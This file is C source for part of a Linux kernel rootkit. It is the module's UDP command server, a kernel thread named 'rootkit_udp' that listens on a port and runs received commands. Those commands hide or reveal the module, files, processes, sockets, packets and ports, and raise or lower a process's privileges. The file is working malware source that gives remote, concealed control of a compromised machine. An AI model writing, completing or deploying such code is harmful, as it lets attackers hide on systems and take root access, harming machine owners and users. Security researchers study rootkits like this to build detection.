#include "utils.h"
#include "core.h"
#include "module_hiding.h"
#include "getdents_hook.h"
#include "socket_hiding.h"
#include "packet_hiding.h"
#include "port_knocking.h"
#include "privilege_escalation.h"
#include "server.h"

/* our kthread for udp socket */
struct kthread_t *kthread = NULL;

void retrieve_num(char *cmdparams, const char __user *buffer, int length)
{
	int i;
	strncpy(cmdparams, buffer, length);

	/* check for every digit if it is in range */
	for(i = 0; i < strlen(cmdparams); i++) {
		if(cmdparams[i] > '9' || cmdparams[i] < '0') {
			cmdparams[i] = '\0';
			return;
		}
	}

	/* max size */
	cmdparams[i] = '\0';
}

char *retrieve_protocol(const char __user *buffer)
{
	char *protocol = kmalloc(5 * sizeof(char), GFP_KERNEL);
	strncpy(protocol, buffer, 4);

	/* set terminator */
	protocol[4] = '\0';

	return protocol;
}

int retrieve_port(const char __user *buffer)
{
	char port[SOC_MAX_DIGIT];

	/* use retrieve num to extract int from string */
	retrieve_num(port, buffer + 5, SOC_MAX_DIGIT - 1);

	return strtoint(port);
}

void cmd_run(const char *command, struct sockaddr_in *addr)
{
	if(!strncmp(command, CMD_HIDE_MODULE, strlen(CMD_HIDE_MODULE))) {
		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_MODULE);
		module_hide();
	}

	if(!strncmp(command, CMD_SHOW_MODULE, strlen(CMD_SHOW_MODULE))) {
		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_MODULE);
		module_unhide();
	}

	if(!strncmp(command, CMD_HIDE_FILE, strlen(CMD_HIDE_FILE))) {
		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_FILE);
		file_hide();
	}

	if(!strncmp(command, CMD_SHOW_FILE, strlen(CMD_SHOW_FILE))) {
		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_FILE);
		file_unhide();
	}

	if(!strncmp(command, CMD_HIDE_PROCESS, strlen(CMD_HIDE_PROCESS))) {
		/* 
		 * 8 as maximum length, since its 4 million at max.
		 * (7 digits + 1 digit for null terminator) 
		 */
		char cmdparams[PID_MAX_DIGIT];
		retrieve_num(cmdparams, command + strlen(CMD_HIDE_PROCESS) + 1, 
			PID_MAX_DIGIT - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_PROCESS);
		process_hide(strtoint(cmdparams));
	}

	if(!strncmp(command, CMD_SHOW_PROCESS, strlen(CMD_SHOW_PROCESS))) {
		/* 
		 * 8 as maximum length, since its 4 million at max.
		 * (7 digits + 1 digit for null terminator)
		 */
		char cmdparams[PID_MAX_DIGIT];
		retrieve_num(cmdparams, command + strlen(CMD_SHOW_PROCESS) + 1, 
			PID_MAX_DIGIT);

		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_PROCESS);
		process_unhide(strtoint(cmdparams));
	}

	if(!strncmp(command, CMD_POP_PROCESS, strlen(CMD_POP_PROCESS))) {
		debug("RUNNING COMMAND \"%s\"", CMD_POP_PROCESS);
		process_pop();
	}

	if(!strncmp(command, CMD_HIDE_SOCKET, strlen(CMD_HIDE_SOCKET))) {
		/* 
		 * 4 for protocol, 8 for port.
		 */
		char cmdparams[PR0TCL_LENGTH + SOC_MAX_DIGIT];
		strncpy(cmdparams, command + strlen(CMD_HIDE_SOCKET) + 1, 
			PR0TCL_LENGTH + SOC_MAX_DIGIT - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_SOCKET);
		socket_hide(retrieve_protocol(cmdparams), 
			retrieve_port(cmdparams));
	}

	if(!strncmp(command, CMD_SHOW_SOCKET, strlen(CMD_SHOW_SOCKET))) {
		/* 
		 * 4 for protocol, 8 for port.
		 */
		char cmdparams[PR0TCL_LENGTH + SOC_MAX_DIGIT];
		strncpy(cmdparams, command + strlen(CMD_SHOW_SOCKET) + 1, 
			PR0TCL_LENGTH + SOC_MAX_DIGIT - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_SOCKET);
		socket_unhide(retrieve_protocol(cmdparams), 
			retrieve_port(cmdparams));
	}

	if(!strncmp(command, CMD_HIDE_PACKET, strlen(CMD_HIDE_PACKET))) {
		/* 
		 * 4 for protocol, INET6_ADDRSTRLEN for address.
		 */
		char cmdparams[PR0TCL_LENGTH + IP_MAX_LENGTH];
		strncpy(cmdparams, command + strlen(CMD_HIDE_PACKET) + 1, 
			PR0TCL_LENGTH + IP_MAX_LENGTH - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_PACKET);
		packet_hide(retrieve_protocol(cmdparams), cmdparams + 5);
	}

	if(!strncmp(command, CMD_SHOW_PACKET, strlen(CMD_SHOW_PACKET))) {
		/* 
		 * 4 for protocol, INET6_ADDRSTRLEN for address.
		 */
		char cmdparams[PR0TCL_LENGTH + IP_MAX_LENGTH];
		strncpy(cmdparams, command + strlen(CMD_SHOW_PACKET) + 1, 
			PR0TCL_LENGTH + IP_MAX_LENGTH - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_PACKET);
		packet_unhide(retrieve_protocol(cmdparams), cmdparams + 5);
	}

	if(!strncmp(command, CMD_HIDE_PORT, strlen(CMD_HIDE_PORT))) {
		/* 5 digits max for port range */
		char cmdparams[LOPORT_LENGTH];
		retrieve_num(cmdparams, command + strlen(CMD_HIDE_PROCESS) + 1, 
			LOPORT_LENGTH - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_PORT);
		port_hide(strtoint(cmdparams));
	}

	if(!strncmp(command, CMD_SHOW_PORT, strlen(CMD_SHOW_PORT))) {
		/* 5 digits max for port range */
		char cmdparams[LOPORT_LENGTH];
		retrieve_num(cmdparams, command + strlen(CMD_SHOW_PROCESS) + 1, 
			LOPORT_LENGTH - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_PORT);
		port_unhide(strtoint(cmdparams));
	}

	if(!strncmp(command, CMD_PROC_ESCALATE, strlen(CMD_PROC_ESCALATE))) {
		/* 5 digits max for port range */
		char cmdparams[PID_MAX_DIGIT];
		retrieve_num(cmdparams, command + strlen(CMD_PROC_ESCALATE) + 1, 
			PID_MAX_DIGIT - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_PROC_ESCALATE);
		process_escalate(strtoint(cmdparams));
	}

	if(!strncmp(command, CMD_PROC_DEESCALATE, 
		strlen(CMD_PROC_DEESCALATE))) {
		/* 5 digits max for port range */
		char cmdparams[PID_MAX_DIGIT];
		retrieve_num(cmdparams, 
			command + strlen(CMD_PROC_DEESCALATE) + 1, 
			PID_MAX_DIGIT - 1);

		debug("RUNNING COMMAND \"%s\"", CMD_PROC_DEESCALATE);
		process_deescalate(strtoint(cmdparams));
	}
}

int udp_server_send(struct socket *sock, struct sockaddr_in *addr, 
	unsigned char *buf, int len)
{
	struct msghdr msghdr;
	struct iovec iov;
	int size = 0;

	if(sock->sk == NULL)
		return 0;

	iov.iov_base = buf;
	iov.iov_len = len;

	msghdr.msg_name = addr;
	msghdr.msg_namelen = sizeof(struct sockaddr_in);
	msghdr.msg_iter.iov = &iov;
	msghdr.msg_control = NULL;
	msghdr.msg_controllen = 0;
	msghdr.msg_flags = 0;

	iov_iter_init(&msghdr.msg_iter, WRITE, &iov, 1, len);
	debug("SEND UDP PACKET TO REMOTE SERVER %pI4", 
		&addr->sin_addr.s_addr);

	size = sock_sendmsg(sock, &msghdr);

	return size;
}

int udp_server_receive(struct socket* sock, struct sockaddr_in* addr, 
	unsigned char* buf, int len)
{
	struct msghdr msghdr;
	struct iovec iov;
	int size = 0;

	if (sock->sk == NULL)
		return 0;

	iov.iov_base = buf;
	iov.iov_len = len;

	msghdr.msg_name = addr;
	msghdr.msg_namelen = sizeof(struct sockaddr_in);
	msghdr.msg_iter.iov = &iov;
	msghdr.msg_control = NULL;
	msghdr.msg_controllen = 0;
	msghdr.msg_flags = 0;

	iov_iter_init(&msghdr.msg_iter, READ, &iov, 1, len);
	debug("RECEIVE UDP PACKET FROM REMOTE SERVER %pI4", 
		&addr->sin_addr.s_addr);

	size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);

	return size;
}

int udp_server_run(void *data)
{
	int size;
	unsigned char buffer[UDP_BUFF];

	kthread->running = 1;
	current->flags |= PF_NOFREEZE;

	debug("CREATE UDP SERVER SOCKET");

	if(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock) < 0) {
		debug("ERROR IN SOCK_CREATE");
		kthread->thread = NULL;
		kthread->running = 0;
		return 0;
	}

	debug("SUCCESSFULLY CREATED UDP SERVER SOCKET");

	memset(&kthread->addr, 0, sizeof(struct sockaddr));
	kthread->addr.sin_family = AF_INET;
	kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
	kthread->addr.sin_port = htons(UDP_PORT);

	debug("SET ADDRESS FAMILY AND PORT FOR UDP SERVER");

	if(kthread->sock->ops->bind(kthread->sock, 
		(struct sockaddr *)&kthread->addr, 
		sizeof(struct sockaddr)) < 0) {
		debug("ERROR IN BIND");
		sock_release(kthread->sock);
		kthread->sock = NULL;
		kthread->thread = NULL;
		kthread->running = 0;
		return 0;
	}

	debug("RUN UDP SERVER LOOP");

	while(1) {
		if(kthread_should_stop())
			do_exit(0);

		memset(&buffer, 0, UDP_BUFF);
		size = udp_server_receive(kthread->sock, &kthread->addr, 
			buffer, UDP_BUFF);

		if(signal_pending(current))
			break;

		if (size > 0)
			cmd_run((const char *)buffer, &kthread->addr);

		schedule();
	}

	return 0;
}

int udp_server_start(void)
{

	/* start kthread for udp socket */
	kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
	kthread->thread = kthread_run(&udp_server_run, NULL, "rootkit_udp");

	debug("INITIALIZING UDP SERVER");

	/* error handling */
	if(kthread->thread == NULL) {
		kfree(kthread);
		kthread = NULL;
		return 1;
	}

	return 0;
}

void udp_server_close(void)
{
	/* kill socket */
	int err;
	struct pid *pid = find_get_pid(kthread->thread->pid);
	struct task_struct *task = pid_task(pid, PIDTYPE_PID);

	debug("EXIT UDP SERVER");

	/* kill kthread */
	if (kthread->thread != NULL) {
		err = send_sig(SIGKILL, task, 1);
		if (err > 0) {
			while (kthread->running == 1)
				msleep(50);
		}
	}

	/* destroy socket */
	if(kthread->sock != NULL) {
		sock_release(kthread->sock);
		kthread->sock = NULL;
	}

	kfree(kthread);
	kthread = NULL;
}

MODULE_LICENSE("GPL");